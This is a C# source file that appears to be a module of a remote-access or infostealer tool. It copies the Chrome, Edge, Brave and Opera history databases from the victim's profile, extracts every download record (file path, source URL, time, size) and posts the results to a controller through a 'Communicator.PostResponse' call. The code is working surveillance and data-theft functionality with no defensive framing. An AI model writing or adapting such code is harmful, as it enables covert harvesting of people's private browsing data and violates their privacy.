using System;
using System.Data.SQLite;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using True.Core;

namespace True.Features
{
    internal static class BrowserDownloadHistoryExtractor
    {
        private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static readonly (string dbPath, string browser)[] Targets =
        {
            (@"Google\Chrome\User Data\Default\History", "Chrome"),
            (@"Microsoft\Edge\User Data\Default\History", "Edge"),
            (@"BraveSoftware\Brave-Browser\User Data\Default\History", "Brave"),
            (@"Opera Software\Opera Stable\History", "Opera")
        };

        public static async Task ExtractAsync()
        {
            StringBuilder result = new();

            foreach (var (relativePath, browser) in Targets)
            {
                try
                {
                    string fullPath = Path.Combine(LocalAppData, relativePath);
                    if (!File.Exists(fullPath))
                    {
                        Logger.Warn($"[DownloadHistory] {browser}: History DB not found.");
                        continue;
                    }

                    string tempPath = Path.GetTempFileName();
                    File.Copy(fullPath, tempPath, true);

                    using var conn = new SQLiteConnection($"Data Source={tempPath};Version=3;");
                    conn.Open();

                    using var cmd = new SQLiteCommand("SELECT target_path, tab_url, start_time, total_bytes FROM downloads", conn);
                    using var reader = cmd.ExecuteReader();

                    int count = 0;
                    while (reader.Read())
                    {
                        string file = reader.IsDBNull(0) ? "(unknown file)" : reader.GetString(0);
                        string url = reader.IsDBNull(1) ? "(unknown url)" : reader.GetString(1);
                        long timestamp = reader.IsDBNull(2) ? 0 : reader.GetInt64(2);
                        long size = reader.IsDBNull(3) ? 0 : reader.GetInt64(3);

                        DateTime time = ChromiumTimeToDateTime(timestamp);
                        result.AppendLine($"[{browser}] {file}\nURL: {url}\nSize: {size} bytes\nTime: {time}\n");
                        count++;
                    }

                    if (count == 0)
                        result.AppendLine($"[{browser}] No download history found.");

                    conn.Close();
                    File.Delete(tempPath);
                }
                catch (Exception ex)
                {
                    Logger.Error($"[DownloadHistory] {browser} failed: {ex.Message}");
                }
            }

            if (result.Length == 0)
                result.Append("(no download history found)");

            await Communicator.PostResponse("browser_downloads", result.ToString().Trim());
        }

        private static DateTime ChromiumTimeToDateTime(long chromeTime)
        {
            // Chromium timestamp = microseconds since 1601-01-01
            return chromeTime == 0
                ? DateTime.MinValue
                : new DateTime(1601, 1, 1).AddTicks(chromeTime * 10);
        }
    }
}
